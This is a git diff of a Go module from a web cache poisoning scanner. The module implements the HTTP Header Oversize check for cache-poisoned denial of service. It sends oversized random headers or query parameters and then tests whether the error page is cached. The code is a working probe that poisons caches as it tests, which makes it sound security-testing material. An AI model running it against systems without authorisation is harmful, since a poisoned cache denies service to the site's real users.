@@ -1,11 +1,11 @@
-package dos
+package cpdos
 
 import (
 	"github.com/projectdiscovery/gologger"
-	"github.com/wealeson1/wcpvs/internal"
 	"github.com/wealeson1/wcpvs/internal/logic/tecniques"
+	"github.com/wealeson1/wcpvs/internal/models"
 	"github.com/wealeson1/wcpvs/pkg/utils"
-	"net/http"
+	"time"
 )
 
 type HHO struct {
@@ -19,48 +19,72 @@ func init() {
 }
 
 func NewHHO() *HHO {
-	// 初始暂定8K
 	payload := utils.RandomString(20480)
 	return &HHO{
 		payload: payload,
 	}
 }
 
-func (h *HHO) Scan(target *internal.TargetStruct) {
-	if target.Cache.CKIsGet {
-		randomHeader := utils.RandomString(10)
-		resp, err := tecniques.GetResp(target, tecniques.HEADER, map[string]string{randomHeader: h.payload})
-		if err != nil {
-			gologger.Error().Msg(err.Error())
-			return
-		}
-		if resp.StatusCode != http.StatusOK {
-			tmpReq := resp.Request
-			resp2, _ := utils.CommonClient.Do(tmpReq)
-			tmpReq.Header.Set(randomHeader, "AAA")
-			resp3, _ := utils.CommonClient.Do(tmpReq)
-			if resp2.StatusCode == resp3.StatusCode {
-				gologger.Info().Msgf("目标%s 存在CPDOS漏洞，检测技术是HHO", target.Request.URL)
-			}
-		}
-		if !target.Cache.CKIsGet && target.Cache.CKIsHeader {
-			randomParam := utils.RandomString(10)
-			resp, err := tecniques.GetResp(target, tecniques.GET, map[string]string{randomParam: h.payload})
+func (h *HHO) Scan(target *models.TargetStruct) {
+	headerSize := 8192
+	mixSize := 20480
+
+	for headerSize <= mixSize {
+		if target.Cache.CKIsAnyGet {
+			randomHeader := utils.RandomString(5)
+			resp, err := tecniques.GetResp(target, tecniques.HEADER, map[string]string{randomHeader: utils.RandomString(headerSize)})
 			if err != nil {
 				gologger.Error().Msg(err.Error())
 				return
 			}
-			if resp.StatusCode != http.StatusOK {
-				tmpReq := resp.Request
-				resp2, _ := utils.CommonClient.Do(tmpReq)
-				values := tmpReq.URL.Query()
-				values.Set(randomParam, "AAA")
-				tmpReq.URL.RawQuery = values.Encode()
-				resp3, _ := utils.CommonClient.Do(tmpReq)
-				if resp2.StatusCode == resp3.StatusCode {
-					gologger.Info().Msgf("目标%s 存在CPDOS漏洞，检测技术是PHO(GET参数溢出)", target.Request.URL)
+			utils.CloseReader(resp.Body)
+			if resp.StatusCode != target.Response.StatusCode {
+				for range 3 {
+					time.Sleep(400 * time.Millisecond)
+					tmpReq, err := utils.CloneRequest(resp.Request)
+					if err != nil {
+						gologger.Error().Msg(err.Error())
+						return
+					}
+					resp, err := utils.CommonClient.Do(tmpReq)
+					if err != nil {
+						gologger.Error().Msg(err.Error())
+						return
+					}
+					if utils.IsCacheHit(target, &resp.Header) {
+						gologger.Info().Msgf("\nThe target %s has a CPDOS vulnerability, detected using HHO. Test: AAAAA...%d.\n", target.Request.URL, headerSize)
+						return
+					}
+					utils.CloseReader(resp.Body)
+				}
+				return
+			}
+		}
+		if !target.Cache.CKIsAnyGet && target.Cache.CKIsHeader {
+			randomParam := utils.RandomString(5)
+			resp, err := tecniques.GetResp(target, tecniques.GET, map[string]string{randomParam: utils.RandomString(headerSize)})
+			if err != nil {
+				gologger.Error().Msg(err.Error())
+				return
+			}
+			if resp.StatusCode != target.Response.StatusCode {
+				for range 3 {
+					tmpReq, err := utils.CloneRequest(resp.Request)
+					if err != nil {
+						gologger.Error().Msg(err.Error())
+						return
+					}
+					resp, err := utils.CommonClient.Do(tmpReq)
+					if err == nil {
+						if utils.IsCacheHit(target, &resp.Header) {
+							gologger.Info().Msgf("\nThe target %s has a CPDOS vulnerability, detected using HHO. Test: AAAAA...%d.\n", target.Request.URL, headerSize)
+							return
+						}
+					}
 				}
 			}
 		}
+		headerSize = headerSize + 1024
 	}
+
 }
